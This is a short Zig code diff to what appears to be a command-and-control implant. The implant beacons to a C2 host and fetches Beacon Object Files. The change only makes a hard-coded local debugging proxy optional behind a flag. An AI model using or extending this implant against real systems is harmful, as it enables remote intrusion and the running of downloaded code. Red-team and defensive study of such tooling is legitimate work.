@@ -6,6 +6,8 @@ const c2_host = "127.0.0.1:8000";
 const c2_endpoint = "/endpoint";
 const jitter = 3;
 
+const enable_debug_http_proxy = false;
+
 pub const std_options = struct {
     pub const http_disable_tls = true;
 };
@@ -16,13 +18,13 @@ fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]u8 {
 
     var http_client: std.http.Client = .{
         .allocator = allocator,
-        .http_proxy = .{
+        .http_proxy = if (enable_debug_http_proxy) .{
             .allocator = allocator,
             .headers = h,
             .protocol = .plain,
             .host = "127.0.0.1",
             .port = 8080,
-        },
+        } else null,
     };
     defer http_client.deinit();
 
@@ -83,13 +85,13 @@ pub fn main() !u8 {
 
     var http_client: std.http.Client = .{
         .allocator = allocator,
-        .http_proxy = .{
+        .http_proxy = if (enable_debug_http_proxy) .{
             .allocator = allocator,
             .headers = heartbeat_header,
             .protocol = .plain,
             .host = "127.0.0.1",
             .port = 8080,
-        },
+        } else null,
     };
     defer http_client.deinit();
 
